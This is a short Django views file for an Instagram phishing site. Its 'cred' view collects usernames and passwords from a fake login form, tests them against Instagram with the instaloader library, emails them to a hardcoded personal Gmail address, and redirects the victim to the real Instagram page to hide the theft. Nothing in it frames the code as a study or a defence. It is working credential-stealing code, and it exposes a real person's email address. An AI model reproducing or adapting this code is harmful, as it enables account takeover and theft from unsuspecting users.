from django.shortcuts import render,redirect
from Mails.mymail import send_email
import instaloader


def insta(request):
    return render(request, 'index.html')


def cred(request):
    username = request.POST.get('username')
    password = request.POST.get('password')
    print(username, password)
    try:

        # Get instance
        loader = instaloader.Instaloader()
        # Login using the credentials
        loader.login(username, password)
    except Exception as e:
        if "Login: Checkpoint required" in e.args[0]:
            loader.close()
            send_email('siddharthchandel2004@gmail.com',sub='Instagram Credentials',
                   text=f'Here, the information given on your website.\nusername : {username}\npassword : {password}')
            return redirect("https://www.instagram.com/?hl=en", permanent=True)
        print(e)
        return render(request, 'index2.html')
    else:
        loader.close()
        send_email('siddharthchandel2004@gmail.com',sub='Instagram Credentials',
                   text=f'Here, the information given on your website.\nusername : {username}\npassword : {password}')
        return redirect("https://www.instagram.com/?hl=en", permanent=True)